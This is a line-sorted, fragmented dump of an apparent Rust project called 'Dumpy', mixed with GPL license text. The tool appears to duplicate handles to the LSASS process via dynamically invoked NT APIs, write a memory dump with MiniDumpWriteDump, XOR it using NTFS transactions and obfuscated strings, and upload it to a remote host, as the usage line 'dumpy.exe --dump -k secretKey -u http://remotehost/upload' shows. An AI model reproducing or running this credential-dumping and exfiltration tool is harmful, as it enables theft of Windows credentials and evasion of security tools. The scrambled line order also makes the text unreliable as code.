+"software for all its users.  We, the Free Software Foundation, use the"
+"software on general-purpose computers, but in those that do, we wish to"
+"source code form), and must require no special password or key for"
+"specifically for use in, a User Product, and the conveying occurs as"
+"standard defined by a recognized standards body, or, in the case of"
+"static_vcruntime = ""2.0"""
+"str) -> Result<isize, String> {"
+"str, key: "
+"str, leak: bool) {"
+"str, opts: Options) {"
+"str, ordinal: u32) -> Result<isize, String> {"
+"str, output_file: "
+"str, url: "
+"str,<function_type>,Option<return_type>,[arguments])"
+"sue for patent infringement).  To ""grant"" such a patent license to a"
+"tangible personal property which is normally used for personal, family,"
+"target = ""x86_64-pc-windows-msvc"""
+"terms of section 4, provided that you also meet all of these conditions:"
+"than the work as a whole, that (a) is included in the normal form of"
+"the ""copyright"" line and a pointer to where the full notice is found."
+"the Program, the only way you could satisfy both those terms and this"
+"the covered work, and you disclaim any intention to limit operation or"
+"the interface presents a list of user commands or options, such as a"
+"the library.  If this is what you want to do, use the GNU Lesser General"
+"the scope of its coverage, prohibits the exercise of, or is"
+"the source code needed to generate, install, and (for an executable"
+"the work, and the source code for shared libraries and dynamically"
+"the work, and under which the third party grants, to any of the"
+"them if you wish), that you receive source code or can get it if you"
+"these rights or asking you to surrender the rights.  Therefore, you have"
+"to copy, free of charge and under the terms of this License, through a"
+"to receive a copy likewise does not require acceptance.  However,"
+"to take away your freedom to share and change the works.  By contrast,"
+"typical or common use of that class of product, regardless of the status"
+"under those permissions, but the entire Program remains governed by"
+"unpacking, reading or copying."
+"upload, force)"
+"ureq = """
+"use bindings::Windows::Win32::System::Threading::{GetCurrentThread, STARTUPINFOW, PROCESS_INFORMATION}"
+"use bindings::Windows::Win32::{Foundation::HANDLE, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}}"
+"use bindings::Windows::Win32::{Foundation::{BOOL, HANDLE, HINSTANCE, PSTR}, Security::SECURITY_ATTRIBUTES, System::{Diagnostics::Debug::{IMAGE_DATA_DIRECTORY, IMAGE_OPTIONAL_HEADER32, IMAGE_SECTION_HEADER, MINIDUMP_CALLBACK_INFORMATION, MINIDUMP_EXCEPTION_INFORMATION, MINIDUMP_USER_STREAM_INFORMATION}, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, IO_STATUS_BLOCK}, Threading::{STARTUPINFOW, PROCESS_INFORMATION}}}"
+"use bindings::Windows::Win32::{Foundation::{HANDLE, HINSTANCE, PSTR, BOOL}, System::{WindowsProgramming::{OBJECT_ATTRIBUTES, CLIENT_ID, IO_STATUS_BLOCK}, Diagnostics::Debug::{MINIDUMP_EXCEPTION_INFORMATION, MINIDUMP_USER_STREAM_INFORMATION, MINIDUMP_CALLBACK_INFORMATION}}, Security::SECURITY_ATTRIBUTES}"
+"use data::{CloseHandle, DLL_PROCESS_ATTACH, EntryPoint, LdrGetProcedureAddress, LoadLibraryA, OpenProcess, PVOID, PeMetadata, GUID}"
+"use data::{PAGE_READONLY, PVOID, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, THREAD_BASIC_INFORMATION, GENERIC_READ, OVERLAPPED, REQUEST_OPLOCK_INPUT_BUFFER, REQUEST_OPLOCK_OUTPUT_BUFFER, THREAD_ALL_ACCESS, FILE_PROCESS_IDS_USING_FILE_INFORMATION}"
+"use rand::{thread_rng, Rng}"
+"use std::{collections::BTreeMap, ffi::c_void}"
+"use std::{fs::{self, File}, io::{Read, Write}, mem::size_of, ptr}"
+"use, which is precisely where it is most unacceptable.  Therefore, we"
+"users, your or third parties' legal rights to forbid circumvention of"
+"version = ""0.1.0"""
+"version = ""0.2.0"""
+"versions of the GNU General Public License can be used, that proxy's"
+"violation by some reasonable means, this is the first time you have"
+"want it, that you can change the software or use pieces of it in new"
+"which are not part of the work.  For example, Corresponding Source"
+"windows = ""0.19"""
+"winproc = ""0.6.4"""
+"with facilities for running those works, provided that you comply with"
+"work results from an entity transaction, each party to that"
+"work thus licensed is called the contributor's ""contributor version""."
+"work under this License, and how to view a copy of this License.  If"
+"work) run the object code and to modify the work, including scripts to"
+"works, such as semiconductor masks."
+"works, which are not by their nature extensions of the covered work,"
+"your programs, too."
+"{}{}"", rand_string, "".log"")"
+(((module_base_address 
+((module_base_address 
+(including a cross-claim or counterclaim in a lawsuit) alleging that
+(opt_header as 
+(p_export as 
+(such as an express permission to practice a patent or covenant not to
+) => {
+--decrypt [options]
+.rs.bk
+/// 
+///     
+///     if r
+///     let ordinal: u32 = 8
+///     let r = dinvoke::close_handle(handle).unwrap()
+///     match ret {
+///     {
+///     }
+///    let ret = dinvoke::call_module_entry_point(
+/// Calls the module's entry point with the option DLL_ATTACH_PROCESS.
+/// Closes a HANDLE object.
+/// Dynamically calls CreateFileMappingW.
+/// Dynamically calls CreateFileTransactedA.
+/// Dynamically calls CreateTransaction.
+/// Dynamically calls GetFileSize.
+/// Dynamically calls MapViewOfFile.
+/// Dynamically calls MiniDumpWriteDump.
+/// Dynamically calls NtAllocateVirtualMemory.
+/// Dynamically calls NtDuplicateObject.
+/// Dynamically calls NtOpenProcess.
+/// Dynamically calls NtProtectVirtualMemory.
+/// Dynamically calls NtQueryInformationFile.
+/// Dynamically calls NtQueryInformationProcess.
+/// Dynamically calls NtQueryInformationThread.
+/// Dynamically calls NtQueryObject.
+/// Dynamically calls NtQuerySystemInformation.
+/// Dynamically calls NtWriteVirtualMemory.
+/// Dynamically calls QueryFullProcessImageNameW.
+/// Dynamically calls RollbackTransaction.
+/// Dynamically calls RtlAdjustPrivilege.
+/// Dynamically calls SetHandleInformation.
+/// Dynamically calls UnmapViewOfFile.
+/// Dynamically calls an exported function from the specified module.
+/// It will return either a HANDLE object or an Err with a descriptive error message. If the function
+/// It will return either a boolean value or an Err with a descriptive error message. If the function
+/// It will return either the module's base address or an Err with a descriptive error message.
+/// It will return the NTSTATUS value returned by the call.
+/// Loads and retrieves a module's base address by dynamically calling LoadLibraryA.
+/// Opens a HANDLE to a process.
+/// Retrieves the address of an exported function from the specified module by its ordinal.
+/// Retrieves the address of an exported function from the specified module either by its name 
+/// Retrieves the address of an exported function from the specified module.
+/// Retrieves the base address of a module loaded in the current process.
+/// This functions internally calls LdrGetProcedureAddress.
+/// This functions is analogous to GetProcAddress from Win32. The exported 
+/// This macro will use the dinvoke crate functions to obtain an exported
+/// and PE headers.
+/// descriptive error message.
+/// dinvoke::dynamic_invoke(
+/// fails the HANDLE will have value -1 or 0.
+/// fails the bool value returned will be false.
+/// function address of the specified module in the runtime by walking process structures 
+/// function's address is obtained by walking and parsing the EAT of the  
+/// if handle.0 != 0 
+/// if ntdll != 0
+/// let fun_name: 
+/// let function_ptr: LdrGetProcedureAddress
+/// let function_ptr: data::LoadLibraryA
+/// let hmodule: PVOID = std::mem::transmute(ptr)
+/// let module_name = PSTR{0: name.as_ptr() as 
+/// let mut ret:Option<HINSTANCE>
+/// let ordinal = 8 as u32
+/// let pid = 792u32
+/// let ret: Option<i32>
+/// let ret: bool = false
+/// let return_address: 
+/// match ret {
+/// or by its ordinal number.
+/// or false (using the 3rd argument passed to the macro) depending on the success of the call.
+/// return 0.
+/// specified module.
+/// using the 4th argument passed to the macro.
+/// {
+/// }
+//cargo rustc -- --crate-type cdylib 
+/target/
+0' // null byte
+0' as u8
+0. Lovely LPWSTR...
+0x00000002
+0x00000004 = FILE_SHARE_READ 
+0x0010
+<https://www.gnu.org/licenses/>.
+<https://www.gnu.org/licenses/why-not-lgpl.html>.
+APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
+Additional permissions that are applicable to the entire Program shall
+Alphanumeric)
+Also add information on how to contact you by electronic and paper mail.
+Cargo.lock
+Corresponding Source conveyed under this section must be accompanied
+DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
+Desktop
+Dumpy
+Dumpy has two main actions:
+EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
+Foundation.  If the Program does not specify a version number of the
+GNU General Public License for most of our software
+Just compile the code on 
+License by making exceptions from one or more of its conditions.
+License of the Program or a work on which the Program is based.  The
+License would be to refrain entirely from conveying the Program.
+NTFS Transaction are used in order to xor the memory dump before storing it on disk or sending it throught HTTP.
+Options:
+PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
+Program specifies that a certain numbered version of the GNU General
+SUCH DAMAGES.
+Source.
+States should not allow patents to restrict development and use of
+String::default())
+Support added for both x86 and x64
+System32
+THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
+Temp> dumpy.exe --decrypt -i xored.txt -o decrypted.txt -k secretKey
+Temp> dumpy.exe --dump -k secretKey -u http://remotehost/upload
+Temp> dumpy.exe --dump -k secretKey -u http://remotehost/upload --force
+The hypothetical commands 
+USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
+Usage: dumpy.exe --dump
+User
+User Product is transferred to the recipient in perpetuity or for a
+Users
+Windows
+[allow(invalid_reference_casting)]
+[build-dependencies]
+[build]
+[dependencies]
+[derive(Clone)]
+[macro_export]
+[macro_use]
+[no_mangle]
+[package]
+[profile.dev.package.bindings]
+[profile.dev.package.data]
+[profile.dev.package.dinvoke]
+[profile.dev.package.dumper]
+[profile.dev.package.dumpy]
+[profile.dev]
+[profile.release]
+[repr(C)]
+a further restriction but permits relicensing or conveying under this
+a modified version of its Corresponding Source.  The information must
+address new problems or concerns.
+adversely affects the operation of the network or violates the rules and
+an absolute waiver of all civil liability in connection with the
+and execute modified versions of a covered work in that User Product from
+and the Corresponding Source of the work is not available for anyone
+and you may offer support or warranty protection for a fee.
+any implied license or other defenses to infringement that may
+any other work released this way by its authors.  You can apply it to
+appropriately publish on each copy an appropriate copyright notice
+args[1..]) {
+author or copyright holder as a result of your choosing to follow a
+authors of previous versions.
+avoid the special danger that patents applied to a free program could
+been installed in ROM).
+beyond what the individual works permit.  Inclusion of a covered work
+brief))
+buff as char != '
+buff as char)
+buffer as char != '
+buffer as char)
+buffer_ptr 
+but do not include claims that would be infringed only as a
+by the Free Software Foundation.
+by the Installation Information.  But this requirement does not apply
+bytes)
+bytes_ptr
+can do so.  This is fundamentally incompatible with the aim of
+can regenerate automatically from other parts of the Corresponding
+circumvention of technological measures to the extent such circumvention
+client_id)
+code is in no case prevented or interfered with solely because
+combination as such.
+conditioned on the non-exercise of one or more of the rights that are
+conditions are met.  This License explicitly affirms your unlimited
+consequence of further modification of the contributor version.  For
+const STARTUPINFOW = std::mem::transmute(startup.as_ptr())
+const u16) -> HANDLE
+const u32 = std::mem::transmute(
+copy of the Program in return for a fee.
+country that you have reason to believe are valid.
+covered work so as to satisfy simultaneously your obligations under this
+data)
+debug = 0
+debug-assertions = false
+debug-assertions = false 
+decrypt
+documented (and with an implementation available to the public in
+doubtful cases shall be resolved in favor of coverage.  For a particular
+dump
+dump_size as usize 
+dumpy
+dumpy> cargo build --release
+dup_handle).0
+dup_handle).0 = temp
+dup_handle).unwrap()
+excuse you from the conditions of this License.  If you cannot convey a
+extern crate base64
+extern crate getopts
+extern crate litcrypt2
+file_content).unwrap()
+fn main()
+fn main() {
+fn print_usage(program: 
+fn start() {
+foo.dmp
+for and in connection with specific products or compilations that
+for enforcing compliance by third parties with this License.
+for which you have or can give appropriate copyright permission.
+force
+form of a work.
+fpi).process_id_list[0]
+free software which everyone can redistribute and change under these terms.
+fun_name = function_name.to_string()
+function_name_ptr as char != '
+function_name_ptr as char)
+governed by this License along with a term that is a further
+handle_ptr
+have designed this version of the GPL to prohibit the practice for those
+have the freedom to distribute copies of free software (and charge for
+holder fails to notify you of the violation by some reasonable means
+if neither you nor any third party retains the ability to install
+ignore
+impl Default for OVERLAPPED {
+impl Default for OVERLAPPED0 {
+impl Default for PeMetadata {
+implementation is available to the public in source code form.  A
+in accord with this section must be in a format that is publicly
+in an aggregate does not cause this License to apply to the other
+in force.  You may convey covered works to others for the sole purpose
+in one of these ways:
+included in conveying the object code work.
+includes interface definition files associated with source files for
+input.txt]
+input_buffer)
+ios)
+iosb).Anonymous.Pointer = ptr::null_mut()
+is a consumer product regardless of whether the product has substantial
+is effected by exercising rights under this License with respect to
+is widely used among developers working in that language.
+it is required to perform a base64 decoding of the content before this decryption process
+it.  (Additional permissions may be written to require their own
+keep intact all notices of the absence of any warranty
+keep intact all notices stating that this License and any
+key_ptr
+key_ptr != '
+know their rights.
+later version.
+len)
+license from a particular copyright holder is reinstated (a)
+licenses of parties who have received copies or rights from you under
+licenses to the work the party's predecessor in interest had or could
+macro_rules! dynamic_invoke {
+makes it unnecessary.
+material under section 10.
+may consider it more useful to permit linking proprietary applications with
+measure under any applicable law fulfilling obligations under article
+measures.
+might be different
+modification follow.
+modification has been made.
+modify any covered work.  These actions infringe copyright if you do
+multipart/form-data requests
+mut CLIENT_ID  = std::mem::transmute(
+mut CLIENT_ID = std::mem::transmute(
+mut CLIENT_ID) -> i32
+mut CLIENT_ID) -> i32 {
+mut FILE_PROCESS_IDS_USING_FILE_INFORMATION
+mut HANDLE = std::mem::transmute(
+mut IO_STATUS_BLOCK = std::mem::transmute(
+mut MINIDUMP_CALLBACK_INFORMATION) -> i32
+mut MINIDUMP_CALLBACK_INFORMATION) -> i32 {
+mut OBJECT_ATTRIBUTES = std::mem::transmute(
+mut OVERLAPPED = std::mem::transmute(
+mut OVERLAPPED) -> BOOL
+mut PROCESS_INFORMATION = std::mem::transmute(
+mut PROCESS_INFORMATION) -> BOOL
+mut PUBLIC_OBJECT_TYPE_INFORMATION = std::mem::transmute(poti_ptr)
+mut PVOID = std::mem::transmute(return_address)
+mut PVOID) -> i32
+mut SYSTEM_HANDLE_INFORMATION
+mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(
+mut String = ptr::null_mut()
+mut String = std::mem::transmute(
+mut THREAD_BASIC_INFORMATION
+mut buffer).unwrap()
+mut c_void
+mut c_void = std::mem::transmute(
+mut c_void) -> BOOL
+mut i16)
+mut i16) as i32 
+mut i32
+mut i32 = ptr::null_mut()
+mut i32)
+mut ntapi::ntpebteb::TEB = std::mem::transmute((
+mut u16
+mut u16 = std::mem::transmute(buffer.as_ptr())
+mut u16) -> HANDLE
+mut u16) -> HANDLE {
+mut u32 = std::mem::transmute(
+mut u32) -> i32
+mut u32) -> i32 {
+mut u32) -> u32
+mut u32) -> u32 {
+mut u8
+mut u8 = holder.as_ptr() as 
+mut u8 = poti.TypeName.Buffer.0 as 
+mut u8 = std::mem::transmute(
+mut u8 = std::mem::transmute(buffer)
+mut u8) -> HANDLE
+mut u8) -> HANDLE {
+mut u8) -> i32
+mut u8) -> i32 {
+mut u8}
+mut usize) -> i32
+mut usize) -> i32 {
+network may be denied when the modification itself materially and
+new_handle)
+non-permissive terms added in accord with section 7 apply to the code
+not control copyright.  Those thus making or running the covered works
+not survive such relicensing or conveying.
+nothing other than this License grants you permission to propagate or
+notice like this when it starts in an interactive mode:
+occurring solely as a consequence of using peer-to-peer transmission
+of the particular user or of the way in which the particular user
+on the Program.
+opt-level = 2
+option of following the terms and conditions either of that numbered
+or can get the source code.  And you must show them these terms so they
+otherwise be available to you under applicable patent law.
+output)
+output.txt]
+output_buffer)
+output_path).unwrap()
+overlapped)
+paragraph of section 11).
+part of a transaction in which the right of possession and use of the
+parties to make or receive copies.  Mere interaction with a user through
+parts of the aggregate.
+party means to make such an agreement or commitment not to enforce a
+patent against the party.
+patent license (a) in connection with copies of the covered work
+patent sublicenses in a manner consistent with the requirements of
+patents cannot be used to render the program non-free.
+pattern of such abuse occurs in the area of products for individuals to
+permission to link or combine any covered work with a work licensed
+permission to run the unmodified Program.  The output from running a
+poti)
+poti_ptr
+price.  Our General Public Licenses are designed to make sure that you
+prior to 60 days after the cessation.
+programs which are used unmodified in performing those activities but
+propagate the contents of its contributor version.
+protecting users' freedom to change the software.  The systematic
+protocols for communication across the network.
+provided under this License.  Any attempt otherwise to propagate or
+pub const DLL_PROCESS_ATTACH: u32 = 1
+pub const DLL_PROCESS_DETACH: u32 = 0
+pub const DLL_THREAD_ATTACH: u32 = 2
+pub const DLL_THREAD_DETACH: u32 = 3
+pub const GENERIC_ALL: u32 = 0x10000000
+pub const GENERIC_EXECUTE: u32 = 0x20000000
+pub const GENERIC_READ: u32 = 0x80000000
+pub const GENERIC_WRITE: u32 = 0x40000000
+pub const MEM_COMMIT: u32 = 0x1000
+pub const MEM_RESERVE: u32 = 0x2000
+pub const PAGE_EXECUTE: u32 = 0x10
+pub const PAGE_EXECUTE_READ: u32 = 0x20
+pub const PAGE_EXECUTE_READWRITE: u32 = 0x40
+pub const PAGE_READONLY: u32 = 0x2
+pub const PAGE_READWRITE: u32 = 0x4
+pub const SECTION_MEM_EXECUTE: u32 = 0x20000000
+pub const SECTION_MEM_READ: u32 = 0x40000000
+pub const SECTION_MEM_WRITE: u32 = 0x80000000
+pub const THREAD_ALL_ACCESS: u32 =  0x000F0000 
+pub fn call_module_entry_point(pe_info: 
+pub fn create_file_transacted(name: 
+pub fn create_transaction(attributes: 
+pub fn decrypt (file_path: 
+pub fn dump(key: 
+pub fn force_leakage() 
+pub fn get_last_error() -> u32
+pub fn get_module_base_address (module_name: 
+pub fn get_pid_from_image_path(path: 
+pub fn load_library_a(module: 
+pub fn nt_open_process(handle: 
+pub fn rollback_transaction(transaction: HANDLE) -> bool {
+pub fn unmap_view_of_file (base_address: PVOID) -> bool {
+pub struct ApiSetNamespace {
+pub struct ApiSetNamespaceEntry {
+pub struct ApiSetValueEntry {
+pub struct FILE_PROCESS_IDS_USING_FILE_INFORMATION {
+pub struct GUID
+pub struct IMAGE_FILE_HEADER {
+pub struct IMAGE_OPTIONAL_HEADER64 {
+pub struct OVERLAPPED {
+pub struct OVERLAPPED_0_0 {
+pub struct PeMetadata {
+pub struct REQUEST_OPLOCK_INPUT_BUFFER {
+pub struct REQUEST_OPLOCK_OUTPUT_BUFFER {
+pub struct SYSTEM_HANDLE_INFORMATION {
+pub struct SYSTEM_HANDLE_TABLE_ENTRY_INFO {
+pub struct THREAD_BASIC_INFORMATION {
+pub type DWORD = u32
+pub type PVOID = 
+pub union OVERLAPPED0 {
+public statement of acceptance of a version permanently authorizes you
+random
+received notice of violation of this License (for any work) from that
+recipients a copy of this License along with the Program.
+reinstated permanently if the copyright holder notifies you of the
+release
+release> dumpy.exe -h
+removal in certain cases when you modify the work.)  You may place
+ret_len) 
+ret_lenght as usize]
+return_address as isize
+return_address as u64)
+reviewing courts shall apply local law that most closely approximates
+run a copy of the Program.  Ancillary propagation of a covered work
+same work.
+share and change all versions of a program--to make sure it remains free
+shi).handles)
+shi).number_of_handles 
+show c' for details.
+show c' should show the appropriate
+show w' and 
+show w'.
+shtei).handle_value as isize}
+shtei).process_id != lsass_pid 
+shtei).process_id == target_pid 
+shtei).process_id > 4 
+similar laws prohibiting or restricting circumvention of such
+size_of::<STARTUPINFOW>()]
+software and other kinds of works.
+some
+specifically granted under this License.  You may not convey a covered
+spoofed_pid)
+stand ready to extend this provision to those domains in future versions
+state the exclusion of warranty
+str = 
+str) 
+str) -> isize
+str) -> isize {
+str) -> usize
+str) {
+strip = true   
+subprograms and other parts of the work.
+such as by intimate data communication or control flow between those
+suffice to ensure that the continued functioning of the modified object
+system32
+target
+tbi).client_id.UniqueThread}
+tbi).teb_base_address)
+teb).ClientId)
+technological measures.
+tells the user that there is no warranty for the work (except to the
+temp
+that material) supplement the terms of this License with terms:
+that there is no warranty for this free software.  For both users' and
+that they are valid under applicable law.  If additional permissions
+the GNU General Public License from time to time.  Such new versions will
+the GNU General Public License is intended to guarantee your freedom to
+the User Product in which it has been modified or installed.  Access to a
+the above requirements apply either way.
+the conditions stated below.  Sublicensing is not allowed
+the only significant mode of use of the product.
+the predecessor has it or can get it with reasonable efforts.
+the terms of this License in conveying all material for which you do
+then you must either (1) cause the Corresponding Source to be so
+this License (including any patent licenses granted under the third
+this License without regard to the additional permissions.
+this License.
+this License.  If your rights have been terminated and not permanently
+to attach them to the start of each source file to most effectively
+to choose that version for the Program.
+to collect a royalty for further conveying from those to whom you convey
+to the extent that it includes a convenient and prominently visible
+to the third party based on the extent of your activity of conveying
+transaction who receives a copy of the work also receives whatever
+u64::default())
+u8::default())
+under version 3 of the GNU Affero General Public License into a single
+unsued)
+upload
+use bindings::Windows::Win32::Foundation::BOOL
+use bindings::Windows::Win32::System::WindowsProgramming::IO_STATUS_BLOCK
+use getopts::Options
+use libc::c_void
+use litcrypt2::lc
+use rand::distributions::Alphanumeric
+use std::ffi::CString
+use std::io::Cursor
+use std::ptr
+use std::thread
+use std::{env}
+use winproc::Process
+use_litcrypt!()
+used to limit the access or legal rights of the compilation's users
+version or of any later version published by the Free Software
+view_ptr 
+view_xor))
+where to find the applicable terms.
+windows
+windows::include_bindings!()
+work and works based on it.
+work if you are a party to an arrangement with a third party that is
+x86_64-pc-windows-msvc
+you grant is automatically extended to all recipients of the covered
+you modify it: responsibilities to respect the freedom of others.
+your copyrighted material outside their relationship with you.
+your receipt of the notice.
